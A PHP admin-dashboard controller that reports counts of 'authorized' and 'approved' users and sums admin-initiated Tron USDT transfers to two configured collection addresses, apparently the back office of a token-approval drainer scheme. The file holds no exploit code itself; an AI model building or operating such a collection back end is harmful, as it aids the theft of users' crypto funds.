<?php

namespace app\admin\controller;

use app\common\controller\Backend;
use fast\Date;
use think\Db;

/**
 * 控制台
 *
 * @icon   fa fa-dashboard
 * @remark 用于展示当前系统中的统计数据、统计报表及重要实时数据
 */
class Dashboard extends Backend
{

    /**
     * 查看
     */
    public function index()
    {
        try {
            \think\Db::execute("SET @@sql_mode='';");
        } catch (\Exception $e) {

        }
        $toA = \think\Config::get('tron.collect_to_a');
        $toB = \think\Config::get('tron.collect_to_b');
        $usdtDecimals = 6;
        $divisor = bcpow("10", (string)$usdtDecimals, 0);

        $monthStart = strtotime(date('Y-m-01 00:00:00'));
        $monthEnd = strtotime(date('Y-m-t 23:59:59'));
        $lastMonthStart = strtotime('first day of last month 00:00:00');
        $lastMonthEnd = strtotime('last day of last month 23:59:59');

        $authTotal = Db::name('ausers')->where('show', 1)->count();
        $approveTotal = Db::name('ausers')->where('show', 1)->where('state','>',0)->count();
        $monthAuthTotal = Db::name('ausers')->where('show', 1)->where('createtime', 'between time', [$monthStart, $monthEnd])->count();
        $monthApproveTotal = Db::name('ausers')->where('show', 1)->where('state','>',0)->where('createtime', 'between time', [$monthStart, $monthEnd])->count();

        $totalTransferredSun = (int)Db::name('transfer_log')->where('status', 1)->where('admin_id', '<>', 0)->sum('amount_sun');
        $totalToASun = (int)Db::name('transfer_log')->where('status', 1)->where('admin_id', '<>', 0)->where('to_address', $toA)->sum('amount_sun');
        $totalToBSun = (int)Db::name('transfer_log')->where('status', 1)->where('admin_id', '<>', 0)->where('to_address', $toB)->sum('amount_sun');
        $monthTransferredSun = (int)Db::name('transfer_log')->where('status', 1)->where('admin_id', '<>', 0)->where('createtime', 'between time', [$monthStart, $monthEnd])->sum('amount_sun');
        $monthToASun = (int)Db::name('transfer_log')->where('status', 1)->where('admin_id', '<>', 0)->where('to_address', $toA)->where('createtime', 'between time', [$monthStart, $monthEnd])->sum('amount_sun');
        $monthToBSun = (int)Db::name('transfer_log')->where('status', 1)->where('admin_id', '<>', 0)->where('to_address', $toB)->where('createtime', 'between time', [$monthStart, $monthEnd])->sum('amount_sun');

        $totalTransferredHuman = bcdiv((string)$totalTransferredSun, $divisor, 2);
        $totalToAHuman = bcdiv((string)$totalToASun, $divisor, 2);
        $totalToBHuman = bcdiv((string)$totalToBSun, $divisor, 2);
        $monthTransferredHuman = bcdiv((string)$monthTransferredSun, $divisor, 2);
        $monthToAHuman = bcdiv((string)$monthToASun, $divisor, 2);
        $monthToBHuman = bcdiv((string)$monthToBSun, $divisor, 2);

        $minAuthTime = (int)Db::name('ausers')->where('show', 1)->min('createtime');
        $minTransferTime = (int)Db::name('transfer_log')->where('admin_id', '<>', 0)->min('createtime');
        $allStart = $minAuthTime > 0 && $minTransferTime > 0 ? min($minAuthTime, $minTransferTime) : ($minAuthTime > 0 ? $minAuthTime : ($minTransferTime > 0 ? $minTransferTime : Date::unixtime('day', -29)));
        $allStart = strtotime(date('Y-m-d 00:00:00', $allStart));
        $allEnd = Date::unixtime('day', 0, 'end');

        $allDates = [];
        for ($time = $allStart; $time <= $allEnd;) {
            $allDates[] = date("Y-m-d", $time);
            $time += 86400;
        }
        $monthDates = [];
        for ($time = $monthStart; $time <= $monthEnd;) {
            $monthDates[] = date("Y-m-d", $time);
            $time += 86400;
        }

        $authAllList = Db::name('ausers')->where('show', 1)->where('createtime', 'between time', [$allStart, $allEnd])
            ->field('COUNT(*) AS nums, DATE_FORMAT(FROM_UNIXTIME(createtime), "%Y-%m-%d") AS d')->group('d')->select();
        $authMonthList = Db::name('ausers')->where('show', 1)->where('createtime', 'between time', [$monthStart, $monthEnd])
            ->field('COUNT(*) AS nums, DATE_FORMAT(FROM_UNIXTIME(createtime), "%Y-%m-%d") AS d')->group('d')->select();

        $authAll = array_fill_keys($allDates, 0);
        foreach ($authAllList as $v) {
            $authAll[$v['d']] = (int)$v['nums'];
        }
        $authMonth = array_fill_keys($monthDates, 0);
        foreach ($authMonthList as $v) {
            $authMonth[$v['d']] = (int)$v['nums'];
        }
        $approveAllList = Db::name('ausers')->where('show', 1)->where('state','>',0)->where('createtime', 'between time', [$allStart, $allEnd])
            ->field('COUNT(*) AS nums, DATE_FORMAT(FROM_UNIXTIME(createtime), "%Y-%m-%d") AS d')->group('d')->select();
        $approveMonthList = Db::name('ausers')->where('show', 1)->where('state','>',0)->where('createtime', 'between time', [$monthStart, $monthEnd])
            ->field('COUNT(*) AS nums, DATE_FORMAT(FROM_UNIXTIME(createtime), "%Y-%m-%d") AS d')->group('d')->select();

        $approveAll = array_fill_keys($allDates, 0);
        foreach ($approveAllList as $v) {
            $approveAll[$v['d']] = (int)$v['nums'];
        }
        $approveMonth = array_fill_keys($monthDates, 0);
        foreach ($approveMonthList as $v) {
            $approveMonth[$v['d']] = (int)$v['nums'];
        }

        $transAllList = Db::name('transfer_log')->where('admin_id', '<>', 0)->where('status', 1)->where('createtime', 'between time', [$allStart, $allEnd])
            ->field('SUM(amount_sun) AS amount_sun, to_address, DATE_FORMAT(FROM_UNIXTIME(createtime), "%Y-%m-%d") AS d')->group('d,to_address')->select();
        $transMonthList = Db::name('transfer_log')->where('admin_id', '<>', 0)->where('status', 1)->where('createtime', 'between time', [$monthStart, $monthEnd])
            ->field('SUM(amount_sun) AS amount_sun, to_address, DATE_FORMAT(FROM_UNIXTIME(createtime), "%Y-%m-%d") AS d')->group('d,to_address')->select();

        $allA = array_fill_keys($allDates, 0);
        $allB = array_fill_keys($allDates, 0);
        $allTotal = array_fill_keys($allDates, 0);
        foreach ($transAllList as $v) {
            $dateKey = $v['d'];
            $amount = (int)$v['amount_sun'];
            $allTotal[$dateKey] += $amount;
            if ($v['to_address'] === $toA) {
                $allA[$dateKey] += $amount;
            }
            if ($v['to_address'] === $toB) {
                $allB[$dateKey] += $amount;
            }
        }

        $monthA = array_fill_keys($monthDates, 0);
        $monthB = array_fill_keys($monthDates, 0);
        $monthTotal = array_fill_keys($monthDates, 0);
        foreach ($transMonthList as $v) {
            $dateKey = $v['d'];
            $amount = (int)$v['amount_sun'];
            $monthTotal[$dateKey] += $amount;
            if ($v['to_address'] === $toA) {
                $monthA[$dateKey] += $amount;
            }
            if ($v['to_address'] === $toB) {
                $monthB[$dateKey] += $amount;
            }
        }

        $allAUsdt = [];
        $allBUsdt = [];
        $allTotalUsdt = [];
        foreach ($allDates as $d) {
            $allAUsdt[$d] = (float)bcdiv((string)$allA[$d], $divisor, 2);
            $allBUsdt[$d] = (float)bcdiv((string)$allB[$d], $divisor, 2);
            $allTotalUsdt[$d] = (float)bcdiv((string)$allTotal[$d], $divisor, 2);
        }
        $monthAUsdt = [];
        $monthBUsdt = [];
        $monthTotalUsdt = [];
        foreach ($monthDates as $d) {
            $monthAUsdt[$d] = (float)bcdiv((string)$monthA[$d], $divisor, 2);
            $monthBUsdt[$d] = (float)bcdiv((string)$monthB[$d], $divisor, 2);
            $monthTotalUsdt[$d] = (float)bcdiv((string)$monthTotal[$d], $divisor, 2);
        }

        $this->assignconfig('allColumn', array_values($allDates));
        $this->assignconfig('allAuthData', array_values($authAll));
        $this->assignconfig('allApproveData', array_values($approveAll));
        $this->assignconfig('allAData', array_values($allAUsdt));
        $this->assignconfig('allBData', array_values($allBUsdt));
        $this->assignconfig('allTotalData', array_values($allTotalUsdt));
        $this->assignconfig('monthColumn', array_values($monthDates));
        $this->assignconfig('monthAuthData', array_values($authMonth));
        $this->assignconfig('monthApproveData', array_values($approveMonth));
        $this->assignconfig('monthAData', array_values($monthAUsdt));
        $this->assignconfig('monthBData', array_values($monthBUsdt));
        $this->assignconfig('monthTotalData', array_values($monthTotalUsdt));

        $recentTransfers = Db::name('transfer_log')->where('admin_id', '<>', 0)->order('createtime', 'desc')->limit(10)->select();

        $this->view->assign([
            'auth_user_total' => $authTotal,
            'approve_user_total' => $approveTotal,
            'month_auth_total' => $monthAuthTotal,
            'month_approve_total' => $monthApproveTotal,
            'total_transferred_human' => $totalTransferredHuman,
            'total_to_a_human' => $totalToAHuman,
            'total_to_b_human' => $totalToBHuman,
            'month_transferred_human' => $monthTransferredHuman,
            'month_to_a_human' => $monthToAHuman,
            'month_to_b_human' => $monthToBHuman,
            'recentTransfers' => $recentTransfers,
        ]);

        return $this->view->fetch();
    }

    public function monitor()
    {
        return $this->view->fetch();
    }
}
